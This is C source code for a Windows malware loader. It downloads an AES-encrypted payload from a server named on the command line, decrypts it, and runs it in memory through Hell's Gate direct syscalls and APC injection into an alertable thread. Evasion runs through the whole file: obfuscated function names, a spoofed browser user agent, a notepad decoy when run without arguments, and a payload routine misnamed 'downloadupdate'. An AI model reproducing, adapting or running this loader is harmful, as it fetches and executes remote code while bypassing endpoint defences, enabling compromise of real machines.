#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "hellshell.h"
#include "structs.h"

#pragma comment(lib, "winhttp.lib")

char* g_randomNameChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

// Syscalls Hashes Values
#define NtAllocateVirtualMemory_djb2 0x7B2D1D431C81F5F6
#define NtWriteVirtualMemory_djb2 0x54AEE238645CCA7C
#define NtProtectVirtualMemory_djb2 0xA0DCC2851566E832
#define NtQueueApcThread_djb2 0x331E6B6B7E696022

char* dKr8m3J1sL(int length) {
    char* result = (char*)malloc(length + 1);
    if (!result) return NULL;

    for (int i = 0; i < length; i++) {
        result[i] = g_randomNameChars[rand() % 52];
    }
    result[length] = '\0';
    return result;
}

typedef struct {
    char name[64];
    unsigned char* data;
    size_t dataSize;
} c3nxP7lW2b;

#define MAX_STORED_VARIABLES 20
c3nxP7lW2b g_storedVariables[MAX_STORED_VARIABLES];
int g_numStoredVariables = 0;
c3nxP7lW2b* pT7wN3kR4l(const char* text);

BOOL qF2k9TxbL3(const wchar_t* serverName, const wchar_t* filePath, char** outBuffer, DWORD* outSize, BOOL useHttps) {
    BOOL result = FALSE;
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    DWORD bytesRead = 0;
    DWORD downloadSize = 0;
    DWORD bytesAvailable = 0;
    char* buffer = NULL;
    char* tempBuffer = NULL;
    INTERNET_PORT port = useHttps ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT;
    DWORD flags = useHttps ? WINHTTP_FLAG_SECURE : 0;

    hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) goto cleanup;

    hConnect = WinHttpConnect(hSession, serverName, port, 0);
    if (!hConnect) goto cleanup;

    hRequest = WinHttpOpenRequest(hConnect, L"GET", filePath,
        NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        flags);
    if (!hRequest) goto cleanup;

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {

        if (useHttps) {
            if (hRequest) WinHttpCloseHandle(hRequest);
            if (hConnect) WinHttpCloseHandle(hConnect);

            port = INTERNET_DEFAULT_HTTP_PORT;
            flags = 0;

            hConnect = WinHttpConnect(hSession, serverName, port, 0);
            if (!hConnect) goto cleanup;

            hRequest = WinHttpOpenRequest(hConnect, L"GET", filePath,
                NULL, WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                flags);
            if (!hRequest) goto cleanup;

            if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
                goto cleanup;
            }
        }
        else {
            goto cleanup;
        }
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) goto cleanup;

    buffer = (char*)malloc(4096);
    if (!buffer) goto cleanup;

    downloadSize = 0;
    DWORD bufferSize = 4096;

    do {
        bytesAvailable = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &bytesAvailable)) goto cleanup;

        if (bytesAvailable == 0) break;

        if (downloadSize + bytesAvailable > bufferSize) {
            bufferSize = downloadSize + bytesAvailable + 4096;
            tempBuffer = (char*)realloc(buffer, bufferSize);
            if (!tempBuffer) goto cleanup;
            buffer = tempBuffer;
        }

        if (!WinHttpReadData(hRequest, buffer + downloadSize, bytesAvailable, &bytesRead)) {
            goto cleanup;
        }

        downloadSize += bytesRead;
    } while (bytesAvailable > 0);

    tempBuffer = (char*)realloc(buffer, downloadSize + 1);
    if (!tempBuffer) goto cleanup;
    buffer = tempBuffer;
    buffer[downloadSize] = '\0';

    *outBuffer = buffer;
    *outSize = downloadSize;
    buffer = NULL;
    result = TRUE;

cleanup:
    if (buffer) free(buffer);
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return result;
}

BOOL h8G3vR7pT5(const char* line, char* outName, size_t maxNameLen) {
    const char* start = strstr(line, "unsigned char ");
    if (!start) return FALSE;

    start += 14;
    const char* end = strstr(start, "[]");
    if (!end || end - start >= maxNameLen) return FALSE;

    memcpy(outName, start, end - start);
    outName[end - start] = '\0';
    return TRUE;
}

BOOL z2J6fQ9mK3(const char* str, unsigned char* outByte) {
    if (strncmp(str, "0x", 2) != 0) return FALSE;

    char hexStr[3] = { str[2], str[3], '\0' };
    char* endPtr = NULL;
    *outByte = (unsigned char)strtol(hexStr, &endPtr, 16);

    return (endPtr != hexStr);
}

c3nxP7lW2b* findStoredVariable(const char* name) {
    for (int i = 0; i < g_numStoredVariables; i++) {
        if (strcmp(g_storedVariables[i].name, name) == 0) {
            return &g_storedVariables[i];
        }
    }
    return NULL;
}

void cL8sB4xZ6f(const char* content) {
    const char* line = content;
    const char* nextLine = NULL;
    char* variableData = NULL;

    while (line && *line) {
        nextLine = strchr(line, '\n');
        size_t lineLen = nextLine ? (nextLine - line) : strlen(line);

        if (strstr(line, "unsigned char ") && strstr(line, "[]")) {
            const char* endDecl = strstr(line, "};");
            if (!endDecl) {
                line = nextLine ? (nextLine + 1) : NULL;
                continue;
            }

            size_t declSize = (endDecl + 2) - line;
            variableData = (char*)malloc(declSize + 1);
            if (!variableData) {
                line = nextLine ? (nextLine + 1) : NULL;
                continue;
            }

            memcpy(variableData, line, declSize);
            variableData[declSize] = '\0';

            c3nxP7lW2b* parsedArray = pT7wN3kR4l(variableData);
            if (parsedArray) {
                if (g_numStoredVariables < MAX_STORED_VARIABLES) {
                    strcpy_s(g_storedVariables[g_numStoredVariables].name, sizeof(g_storedVariables[g_numStoredVariables].name), parsedArray->name);
                    g_storedVariables[g_numStoredVariables].data = parsedArray->data;
                    g_storedVariables[g_numStoredVariables].dataSize = parsedArray->dataSize;

                    printf("[+] Stored %s with %zu bytes at index %d\n",
                        parsedArray->name, parsedArray->dataSize, g_numStoredVariables);

                    g_numStoredVariables++;

                    free(parsedArray);
                }
                else {
                    printf("[-] Warning: No more space to store variable %s\n", parsedArray->name);
                    free(parsedArray->data);
                    free(parsedArray);
                }
            }

            free(variableData);

            line = endDecl + 2;
        }
        else {
            line = nextLine ? (nextLine + 1) : NULL;
        }
    }
}

/*--------------------------------------------------------------------
  VX Tables
--------------------------------------------------------------------*/
typedef struct _VX_TABLE_ENTRY {
    PVOID   pAddress;
    DWORD64 dwHash;
    WORD    wSystemCall;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;

typedef struct _VX_TABLE {
    VX_TABLE_ENTRY NtAllocateVirtualMemory;
    VX_TABLE_ENTRY NtWriteVirtualMemory;
    VX_TABLE_ENTRY NtProtectVirtualMemory;
    VX_TABLE_ENTRY NtQueueApcThread;
} VX_TABLE, * PVX_TABLE;

/*--------------------------------------------------------------------
  Function prototypes.
--------------------------------------------------------------------*/
PTEB RtlGetThreadEnvironmentBlock();
BOOL GetImageExportDirectory(
    _In_ PVOID                     pModuleBase,
    _Out_ PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory
);
BOOL GetVxTableEntry(
    _In_ PVOID pModuleBase,
    _In_ PIMAGE_EXPORT_DIRECTORY pImageExportDirectory,
    _In_ PVX_TABLE_ENTRY pVxTableEntry
);
/*--------------------------------------------------------------------
  External functions' prototype.
--------------------------------------------------------------------*/
extern VOID HellsGate(WORD wSystemCall);
extern HellDescent();

BOOL downloadupdate(IN PVX_TABLE pVxTable, IN HANDLE hProcess, IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

    NTSTATUS	STATUS = 0x00;
    PVOID		pAddress = NULL;
    ULONG		uOldProtection = NULL;

    SIZE_T		sSize = sPayloadSize,
        sNumberOfBytesWritten = NULL;


    // allocating memory 
    HellsGate(pVxTable->NtAllocateVirtualMemory.wSystemCall);
    if ((STATUS = HellDescent(hProcess, &pAddress, 0, &sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
        printf("[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
        return FALSE;
    }
    printf("[+] Allocated Address At : 0x%p Of Size : %d \n", pAddress, sSize);

    //--------------------------------------------------------------------------

        // writing the payload
    printf("[#] Press <Enter> To Write The Payload ... ");
    getchar();
    printf("\t[i] Writing Payload Of Size %d ... ", sPayloadSize);
    HellsGate(pVxTable->NtWriteVirtualMemory.wSystemCall);
    if ((STATUS = HellDescent(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
        printf("[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
        printf("[i] Bytes Written : %d of %d \n", sNumberOfBytesWritten, sPayloadSize);
        return FALSE;
    }
    printf("[+] DONE \n");

    //--------------------------------------------------------------------------

        // changing the memory's permissions to RWX
    HellsGate(pVxTable->NtProtectVirtualMemory.wSystemCall);
    if ((STATUS = HellDescent(hProcess, &pAddress, &sPayloadSize, PAGE_EXECUTE_READWRITE, &uOldProtection)) != 0) {
        printf("[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
        return FALSE;
    }

    //--------------------------------------------------------------------------

        // executing the payload via NtQueueApcThread

    printf("[#] Press <Enter> To Run The Payload ... ");
    getchar();
    printf("\t[i] Running Payload At 0x%p Using Thread Of Id : %d ... ", pAddress, GetThreadId(hThread));
    HellsGate(pVxTable->NtQueueApcThread.wSystemCall);
    if ((STATUS = HellDescent(hThread, pAddress, NULL, NULL, NULL)) != 0) {
        printf("[!] NtQueueApcThread Failed With Error : 0x%0.8X \n", STATUS);
        return FALSE;
    }
    printf("[+] DONE \n");


    return TRUE;
}

c3nxP7lW2b* pT7wN3kR4l(const char* text) {
    c3nxP7lW2b* result = (c3nxP7lW2b*)malloc(sizeof(c3nxP7lW2b));
    if (!result) return NULL;

    memset(result, 0, sizeof(c3nxP7lW2b));

    // Extract variable name
    if (!h8G3vR7pT5(text, result->name, sizeof(result->name))) {
        free(result);
        return NULL;
    }

    // Count bytes in the array
    const char* ptr = text;
    size_t count = 0;

    while ((ptr = strstr(ptr, "0x"))) {
        count++;
        ptr += 2;
    }

    // Allocate memory for the data
    result->data = (unsigned char*)malloc(count);
    if (!result->data) {
        free(result);
        return NULL;
    }

    // Parse each byte
    ptr = text;
    size_t index = 0;

    while ((ptr = strstr(ptr, "0x")) && index < count) {
        z2J6fQ9mK3(ptr, &result->data[index++]);
        ptr += 2;
    }

    result->dataSize = index;
    return result;
}

VOID AlterableFunction() {

    HANDLE	hEvent = CreateEvent(
        NULL,
        NULL,
        NULL,
        NULL
    );

    MsgWaitForMultipleObjectsEx(
        1,
        &hEvent,
        INFINITE,
        QS_HOTKEY,
        MWMO_ALERTABLE
    );

}

PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
    return (PTEB)__readgsqword(0x30);
#else
    return (PTEB)__readfsdword(0x16);
#endif
}

DWORD64 djb2(PBYTE str) {
    DWORD64 dwHash = 0x77347734DEADBEEF;
    INT c;

    while (c = *str++)
        dwHash = ((dwHash << 0x5) + dwHash) + c;

    return dwHash;
}

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
    // Get DOS header
    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
    if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }

    // Get NT headers
    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
    if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }

    // Get the EAT
    *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
    return TRUE;
}

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

    for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
        PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

        if (djb2(pczFunctionName) == pVxTableEntry->dwHash) {
            pVxTableEntry->pAddress = pFunctionAddress;

            // Quick and dirty fix in case the function has been hooked
            WORD cw = 0;
            while (TRUE) {
                // check if syscall, in this case we are too far
                if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
                    return FALSE;

                // check if ret, in this case we are also probaly too far
                if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
                    return FALSE;

                // First opcodes should be :
                //    MOV R10, RCX
                //    MOV RCX, <syscall>
                if (*((PBYTE)pFunctionAddress + cw) == 0x4c
                    && *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
                    && *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
                    && *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
                    && *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
                    && *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
                    BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
                    BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
                    pVxTableEntry->wSystemCall = (high << 8) | low;
                    break;
                }

                cw++;
            };
        }
    }

    return TRUE;
}

int main(int argc, char** argv) {
    srand((unsigned int)time(NULL));

    if (argc < 2) {
        STARTUPINFO si = { sizeof(STARTUPINFO) };
        PROCESS_INFORMATION pi;

        wchar_t cmdLine[] = L"notepad.exe";

        if (CreateProcess(NULL, cmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            printf("[+] Notepad launched successfully\n");
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        else {
            printf("[-] Failed to launch Notepad. Error: %d\n", GetLastError());
        }

        return 0;
    }

    // Command-line arguments must be provided for all values (no defaults)
    if (argc < 3) {
        printf("Usage: %s <xyzremname> <ur-i-pa-th> [http]\n", argv[0]);
        return -1;
    }

    // Convert server name from char* to wchar_t*
    size_t serverNameLen = strlen(argv[1]) + 1;
    wchar_t* serverName = (wchar_t*)malloc(serverNameLen * sizeof(wchar_t));
    if (!serverName) {
        printf("[-] Memory allocation failed for server name\n");
        return -1;
    }
    size_t convertedChars = 0;
    if (mbstowcs_s(&convertedChars, serverName, serverNameLen, argv[1], serverNameLen - 1) != 0) {
        printf("[-] Conversion failed for server name\n");
        free(serverName);
        return -1;
    }

    // Convert file path from char* to wchar_t*
    size_t filePathLen = strlen(argv[2]) + 1;
    wchar_t* filePath = (wchar_t*)malloc(filePathLen * sizeof(wchar_t));
    if (!filePath) {
        free(serverName);
        printf("[-] Memory allocation failed for file path\n");
        return -1;
    }
    convertedChars = 0;
    if (mbstowcs_s(&convertedChars, filePath, filePathLen, argv[2], filePathLen - 1) != 0) {
        printf("[-] Conversion failed for file path\n");
        free(serverName);
        free(filePath);
        return -1;
    }

    // Determine protocol (HTTPS by default, HTTP if specified)
    BOOL useHttps = TRUE;
    if (argc >= 4 && strcmp(argv[3], "http") == 0) {
        useHttps = FALSE;
    }

    char* fileContent = NULL;
    DWORD fileSize = 0;

    printf("[+] Downloading file from %ls%ls...\n", serverName, filePath);

    char* randomFuncName = dKr8m3J1sL(10);
    if (randomFuncName) {
        printf("[+] Using %s protocol handler\n", randomFuncName);
        free(randomFuncName);
    }

    if (qF2k9TxbL3(serverName, filePath, &fileContent, &fileSize, useHttps)) {
        printf("[+] Download successful. File size: %lu bytes\n", fileSize);

        cL8sB4xZ6f(fileContent);

        free(fileContent);
    }
    else {
        printf("[-] Download failed with both HTTPS and HTTP\n");
        free(serverName);
        free(filePath);
        return -1;
    }

    // Free allocated memory for arguments
    free(serverName);
    free(filePath);

    PBYTE pDecryptedData = NULL;
    SIZE_T sDecryptedData = 0;
    c3nxP7lW2b* AesCipherText = findStoredVariable("AesCipherText");
    c3nxP7lW2b* AesKey = findStoredVariable("AesKey");
    c3nxP7lW2b* AesIv = findStoredVariable("AesIv");

    // Check if all required variables were found
    if (!AesCipherText || !AesKey || !AesIv) {
        printf("[-] Missing required variables in downloaded content\n");
        return -1;
    }

    printf("[+] AesCipherText: %s \n", AesCipherText->name);
    printf("[+] AesKey: %s \n", AesKey->name);
    printf("[+] AesIv: %s \n", AesIv->name);

    if (!SimpleDecryption(AesCipherText->data, AesCipherText->dataSize, AesKey->data, AesIv->data, &pDecryptedData, &sDecryptedData)) {
        printf("[!] SimpleDecryption Failed \n");
        return -1;
    }

    // With this code to print binary data in a readable format:
    printf("[+] Decrypted Data (hex): ");
    size_t i;
    for (i = 0; i < sDecryptedData && i < 50; i++) {
        printf("%02X ", ((unsigned char*)pDecryptedData)[i]);
    }
    printf(i < sDecryptedData ? "...\n" : "\n");

    // Optionally, try to print as string if it might be text:
    printf("[+] Decrypted Data (as text, if applicable): ");
    for (size_t i = 0; i < sDecryptedData && i < 100; i++) {
        unsigned char c = ((unsigned char*)pDecryptedData)[i];
        printf("%c", (c >= 32 && c < 127) ? c : '.');
    }
    printf(i < sDecryptedData ? "...\n" : "\n");

    PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
    PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
    if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
        return 0x1;

    // Get NTDLL module 
    PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

    // Get the EAT of NTDLL
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
    if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
        return 0x01;

    //--------------------------------------------------------------------------
    // Initializing the 'Table' structure ...

    VX_TABLE Table = { 0 };
    Table.NtAllocateVirtualMemory.dwHash = NtAllocateVirtualMemory_djb2;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtAllocateVirtualMemory))
        return 0x1;

    Table.NtWriteVirtualMemory.dwHash = NtWriteVirtualMemory_djb2;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWriteVirtualMemory))
        return 0x1;

    Table.NtProtectVirtualMemory.dwHash = NtProtectVirtualMemory_djb2;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtProtectVirtualMemory))
        return 0x1;

    Table.NtQueueApcThread.dwHash = NtQueueApcThread_djb2;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtQueueApcThread))
        return 0x1;

    //--------------------------------------------------------------------------

    // Sacrificial Alertable State Thread 
    HANDLE hThread = CreateThread(NULL, NULL, AlterableFunction, NULL, NULL, NULL);
    if (!hThread) {
        printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
        return -1;
    }

    if (!downloadupdate(&Table, (HANDLE)-1, hThread, pDecryptedData, sDecryptedData)) {
        return -1;
    }

    printf("[#] Press <Enter> To Quit ... ");
    getchar();

    return 0x00;
}